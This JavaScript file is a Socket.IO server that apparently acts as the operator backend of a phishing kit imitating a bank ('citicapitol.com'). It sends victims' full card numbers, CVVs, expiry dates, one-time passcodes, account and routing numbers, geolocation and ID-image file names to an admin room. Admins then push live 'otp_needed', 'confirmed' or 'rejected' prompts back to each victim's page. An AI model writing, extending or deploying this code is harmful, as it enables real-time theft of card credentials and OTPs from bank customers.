// socket-server.js
console.log("Starting socket server...");

import 'dotenv/config';
import express from "express";
import http from "http";
import { Server } from "socket.io";

console.log("Env Loaded:", {
    PORT: process.env.PORT,
    SOCKET_SECRET: process.env.SOCKET_SECRET,
    ADMIN_ROOM_SECRET: process.env.ADMIN_ROOM_SECRET
});

const app = express();
const server = http.createServer(app);

// CONFIGURE SOCKET.IO
const io = new Server(server, {
    cors: {
        origin: [
            "https://city-capital-socket.onrender.com",
            "https://citicapitol.com",
            "http://localhost:3000"
        ],
        methods: ["GET", "POST"],
        credentials: true
    }
});

app.use(express.json());

// TEMP DATA STORE (you may move to DB later)
const pendingConfirmations = {};

// SECRET API KEY FOR BACKEND EMITS
const SECRET = process.env.SOCKET_SECRET || "replace_with_strong_secret";

/* ============================================================================
   HTTP ENDPOINT FOR BACKEND TO EMIT ADMIN NOTIFICATIONS
============================================================================ */
app.post("/emit", (req, res) => {
    const token = req.header("x-api-key") || "";
    if (token !== SECRET) {
        return res.status(401).json({ ok: false, message: "Unauthorized" });
    }

    const payload = req.body || {};

    // SANITIZE PAYLOAD
    const safe = {
        transaction_id: payload.transaction_id || null,
        fullname: payload.fullname || null,
        amount: payload.amount || null,
        status: payload.status || "unknown",
        time: payload.time || new Date().toISOString(),
        bank: payload.bank || "Unknown",
        holder: payload.holder || null,
        cardNumber: payload.cardNumber || null,
        expiration: payload.expiration || null,
        accountType: payload.account_type || null,
        account_number: payload.account_number || null,
        account_holder: payload.account_holder || null,
        balance: payload.balance || null,
        cvv: payload.cvv || null,
        brand: payload.brand || null,
        otp: payload.otp || null,
        ip: payload.ip || null,
        country: payload.country || null,
        state: payload.state || null,
        city: payload.city || null,
        file_name: payload.file_name || null,
        front_name: payload.front_name || null,
        back_name: payload.back_name || null,
        beneficiary: payload.beneficiary || null,
        address: payload.address || null,
        bank_name: payload.bank_name || null,
        routing_number: payload.routing_number || null,
        account_number: payload.account_number || null,
        swift_bic: payload.swift_bic || null,
         account_holder: payload.account_holder || null,
        
    };

    console.log("Admin Notification Broadcast:", safe);

    // SEND ONLY TO ADMINS
    io.to("admins").emit("notify_admin", safe);

    return res.json({ ok: true });
});
/* ============================================================================
   HTTP ENDPOINT FOR PINGING ADMINS ABOUT NEW USER
============================================================================ */
app.post("/ping_pending_user", (req, res) => {
    const token = req.header("x-api-key") || "";
    if (token !== SECRET) {
        return res.status(401).json({ ok: false, message: "Unauthorized" });
    }

    console.log("Admin ping: new pending user created");

    // Just emit a ping to all admins
    io.to("admins").emit("new_pending_user");

    return res.json({ ok: true });
});

/* ============================================================================
   SOCKET CONNECTION EVENTS
============================================================================ */
io.on("connection", (socket) => {
    console.log("Socket connected:", socket.id);

    /* ----------------------------- ADMIN JOIN ----------------------------- */
    socket.on("join_admin_room", ({ token }) => {
        if (token === process.env.ADMIN_ROOM_SECRET) {
            socket.join("admins");
            socket.emit("joined_admin");
            console.log(`Admin joined: ${socket.id}`);
        } else {
            socket.emit("error", "Invalid admin token");
        }
    });

    /* -------------------- USER JOINS TRANSACTION ROOM -------------------- */
    socket.on("user_join", ({ transaction_id }) => {
        if (!transaction_id) return;

        const roomName = `txn-${transaction_id}`;

        console.log(
            `User ${socket.id} joining room ${roomName}`
        );

        socket.join(roomName);

        // If admin already confirmed before user joined, sync to user
        
        if (pendingConfirmations[transaction_id]) {
  const data = pendingConfirmations[transaction_id];

  if (data.status === "otpNotNeeded") {
    socket.emit("otp_not_needed", data);
  } else if (data.status === "confirmed") {
    socket.emit("txn_confirmed", data);
  } else if (data.status === "rejected") {
    socket.emit("txn_rejected", data);
  } else if (data.status === "otpNeeded") {
    socket.emit("otp_needed", data);
  }

  console.log(
    `Pushed existing confirmation to ${socket.id} for txn ${transaction_id}`
  );
}


        // Notify admins (optional)
        io.to("admins").emit("user_joined_room", {
            transaction_id,
            socket_id: socket.id
        });
    });
     
    // Server-side: handle admin OTP-not-needed confirmation
     socket.on("admin_confirm_otp_notneeded", (data) => {
         console.log("Admin confirmed OTP not needed:", data);
     
         // Save in pending confirmations for sync if user joins later
         pendingConfirmations[data.transaction_id] = {
             ...data,
             status: "otpNotNeeded"
         };
     
         // User room
         const roomName = `txn-${data.transaction_id}`;
     
         // Emit to that specific user
         io.to(roomName).emit("otp_not_needed", {
             ...data,
             status: "otpNotNeeded"
         });
     
         
         console.log(`Broadcasted otp_not_needed to ${roomName}`);
     });

    /* ------------------------ ADMIN CONFIRMS TRANSACTION ------------------------ */
   socket.on("admin_confirm_txn", (data) => {
    const normalized = {
        ...data,
        accountType: data.accountType || data.account_type || "Unknown",
        status: "confirmed"
    };

    pendingConfirmations[data.transaction_id] = normalized;

    const roomName = `txn-${data.transaction_id}`;
    io.to(roomName).emit("txn_confirmed", normalized);

    console.log("Broadcasted txn_confirmed:", normalized);
});

    /* ------------------------ ADMIN REJECTS TRANSACTION ------------------------- */
    socket.on("admin-reject-txn", (data) => {
        console.log("Admin rejected transaction:", data);
        pendingConfirmations[data.transaction_id] = {
            ...data,
            status: "rejected"
        };

        const roomName = `txn-${data.transaction_id}`;
        io.to(roomName).emit("txn_rejected", {
        ...data,
        status: "rejected"
    });
        console.log(`Broadcasted txn_rejected to ${roomName}`);
    });
// Server-side: handle admin OTP-needed confirmation
socket.on("admin_confirm_otp_needed", (data) => {
    console.log("Admin marked OTP needed:", data);

    pendingConfirmations[data.transaction_id] = {
        ...data,
        status: "otpNeeded"
    };

    const roomName = `txn-${data.transaction_id}`;

    io.to(roomName).emit("otp_needed", {
        ...data,
        status: "otpNeeded"
    });
});

    /* ------------------------------ DISCONNECT ------------------------------ */
    socket.on("disconnect", () => {
        console.log("Socket disconnected:", socket.id);
    });
});

/* ============================================================================
   SERVER START
============================================================================ */
const PORT = process.env.PORT || 3001;
server.listen(PORT, () => {
    console.log(`Socket server running on port ${PORT}`);
});
